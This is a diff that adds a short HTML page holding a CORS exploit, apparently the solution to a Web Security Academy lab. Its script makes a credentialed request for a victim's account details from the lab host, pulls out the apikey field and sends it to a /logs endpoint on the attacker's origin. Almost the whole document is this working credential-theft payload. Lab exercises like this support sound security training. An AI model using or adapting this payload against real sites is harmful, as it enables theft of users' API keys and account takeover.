@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <h1>Hello</h1>
+    <script>
+      fetch('https://0acc006a046168488151761000c80047.web-security-academy.net/accountDetails', {
+        method: 'GET',
+        credentials: 'include'
+      })
+      .then(response => {
+        return response.json();
+      })
+      .then(body => {
+        fetch("/logs?res=" + body.apikey);
+      })
+    </script>
+  </body>
+</html>
